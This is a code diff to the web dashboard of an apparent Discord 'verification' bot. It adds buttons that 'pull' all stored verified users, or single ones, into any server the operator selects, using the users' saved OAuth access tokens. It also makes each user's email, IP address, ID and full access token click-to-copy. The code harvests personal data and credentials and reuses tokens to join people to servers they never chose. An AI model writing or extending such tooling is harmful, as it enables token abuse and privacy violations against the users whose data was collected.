@@ -233,9 +233,55 @@ function dashboardPage(session) {
 
         function showAllMembers() {
             var main = document.getElementById('mainContent');
+            var serverOptions = '<option value="">-- Select Target Server --</option>';
+            var allGuilds = Object.values(guildCache);
+            for (var i = 0; i < allGuilds.length; i++) {
+                serverOptions += '<option value="' + allGuilds[i].id + '">' + allGuilds[i].name + '</option>';
+            }
+
             main.innerHTML = '<div class="dash-header"><div class="dash-header-icon dash-header-letter">👥</div>' +
                 '<div class="dash-header-info"><h2>All Members</h2><p>Every verified user across all servers</p></div></div>' +
+                '<div style="padding:10px 20px; display:flex; gap:10px; flex-wrap:wrap; align-items:center; background:#1e1e24; border-bottom:1px solid #333;">' +
+                '<select id="targetPullServer" class="dash-input" style="max-width:300px">' + serverOptions + '</select>' +
+                '<button class="dash-btn dash-btn-primary" id="pullAllBtn">Pull All to Selected Server</button>' +
+                '</div>' +
                 '<div id="globalMembersContent"><div class="dash-loading">Loading...</div></div>';
+
+            document.getElementById('pullAllBtn').addEventListener('click', function() {
+                var select = document.getElementById('targetPullServer');
+                var targetGuildId = select.value;
+                if (!targetGuildId) {
+                    alert('Please select a target server first.');
+                    return;
+                }
+                var serverName = select.options[select.selectedIndex].text;
+                if (!confirm('Are you sure you want to start pulling all global members into ' + serverName + '? This might take a while.')) return;
+                
+                var btn = this;
+                var oldText = btn.innerText;
+                btn.innerText = 'Starting...';
+                btn.disabled = true;
+
+                fetch('/api/dashboard/pull-all', {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ targetGuildId: targetGuildId })
+                }).then(function(r) { return r.json(); }).then(function(data) {
+                    if (data.error) {
+                        alert('Error: ' + data.error);
+                        btn.innerText = oldText;
+                        btn.disabled = false;
+                    } else {
+                        alert('Pull process started in the background. Pulling up to ' + data.total + ' users.');
+                        btn.innerText = 'Pulling...';
+                    }
+                }).catch(function(e) {
+                    alert('Error: ' + e.message);
+                    btn.innerText = oldText;
+                    btn.disabled = false;
+                });
+            });
 
             fetch('/api/dashboard/global-members', { credentials: 'include' })
                 .then(function(r) { return r.json(); })
@@ -244,24 +290,73 @@ function dashboardPage(session) {
                         document.getElementById('globalMembersContent').innerHTML = '<div class="dash-empty">No verified members yet</div>';
                         return;
                     }
-                    var html = '<div style="padding:10px 20px"><p>' + data.total + ' total verified records</p></div>' +
+                    var html = '<div style="padding:10px 20px"><p>' + data.total + ' total verified records (Click any text to copy)</p></div>' +
                         '<div class="dash-table-wrap"><table class="dash-table"><thead><tr>' +
-                        '<th>User</th><th>Email</th><th>IP</th><th>Server</th><th>Token</th><th>Verified</th></tr></thead><tbody>';
+                        '<th>User</th><th>Email</th><th>IP</th><th>Server</th><th>Token</th><th>Verified</th><th>Action</th></tr></thead><tbody>';
                     for (var i = 0; i < data.members.length; i++) {
                         var m = data.members[i];
                         var avatar = m.avatar ? 'https://cdn.discordapp.com/avatars/' + m.user_id + '/' + m.avatar + '.png?size=32' : 'https://cdn.discordapp.com/embed/avatars/0.png';
                         var tokenDisplay = m.access_token ? m.access_token.substring(0, 12) + '...' : 'N/A';
                         var date = m.verified_at ? new Date(m.verified_at).toLocaleDateString() : 'Unknown';
+                        
                         html += '<tr><td class="dash-user-cell"><img src="' + avatar + '" class="dash-table-avatar">' +
-                            '<span>' + m.username + '<br><small class="text-muted">' + m.user_id + '</small></span></td>' +
-                            '<td>' + (m.email || 'N/A') + '</td>' +
-                            '<td><code>' + (m.ip_address || 'N/A') + '</code></td>' +
-                            '<td><code>' + m.guild_id + '</code></td>' +
-                            '<td><code class="dash-token" title="' + (m.access_token || '') + '">' + tokenDisplay + '</code></td>' +
-                            '<td>' + date + '</td></tr>';
+                            '<span><span class="click-copy" title="Click to copy username">' + m.username + '</span><br>' +
+                            '<small class="text-muted click-copy" title="Click to copy ID">' + m.user_id + '</small></span></td>' +
+                            '<td><span class="click-copy" title="Click to copy email">' + (m.email || 'N/A') + '</span></td>' +
+                            '<td><code class="click-copy" title="Click to copy IP">' + (m.ip_address || 'N/A') + '</code></td>' +
+                            '<td><code class="click-copy" title="Click to copy Guild ID">' + m.guild_id + '</code></td>' +
+                            '<td><code class="dash-token click-copy" data-full="' + (m.access_token||'') + '" title="Click to copy full token">' + tokenDisplay + '</code></td>' +
+                            '<td>' + date + '</td>' +
+                            '<td><button class="dash-btn dash-btn-sm pull-user-btn" data-userid="' + m.user_id + '">Pull User</button></td></tr>';
                     }
                     html += '</tbody></table></div>';
                     document.getElementById('globalMembersContent').innerHTML = html;
+
+                    // Click to copy delegation
+                    document.getElementById('globalMembersContent').addEventListener('click', function(e) {
+                        if (e.target.classList.contains('click-copy')) {
+                            var text = e.target.getAttribute('data-full') || e.target.innerText;
+                            if (text && text !== 'N/A') {
+                                navigator.clipboard.writeText(text);
+                                var oldColor = e.target.style.color;
+                                e.target.style.color = '#57F287';
+                                setTimeout(function() { e.target.style.color = oldColor; }, 500);
+                            }
+                        }
+
+                        if (e.target.classList.contains('pull-user-btn')) {
+                            var btn = e.target;
+                            var userId = btn.getAttribute('data-userid');
+                            var select = document.getElementById('targetPullServer');
+                            var targetGuildId = select.value;
+                            if (!targetGuildId) {
+                                alert('Please select a target server from the dropdown at the top first.');
+                                return;
+                            }
+                            var oldText = btn.innerText;
+                            btn.innerText = '...';
+                            btn.disabled = true;
+
+                            fetch('/api/dashboard/pull-user', {
+                                method: 'POST', credentials: 'include',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ userId: userId, targetGuildId: targetGuildId })
+                            }).then(function(r) { return r.json(); }).then(function(d) {
+                                if (d.error) {
+                                    alert('Error: ' + d.error);
+                                    btn.innerText = oldText;
+                                    btn.disabled = false;
+                                } else {
+                                    btn.innerText = d.status === 'already_in_server' ? 'Already in' : 'Pulled!';
+                                    btn.classList.add('dash-btn-ghost');
+                                }
+                            }).catch(function(err) {
+                                alert('Error: ' + err.message);
+                                btn.innerText = oldText;
+                                btn.disabled = false;
+                            });
+                        }
+                    });
                 });
         }
 
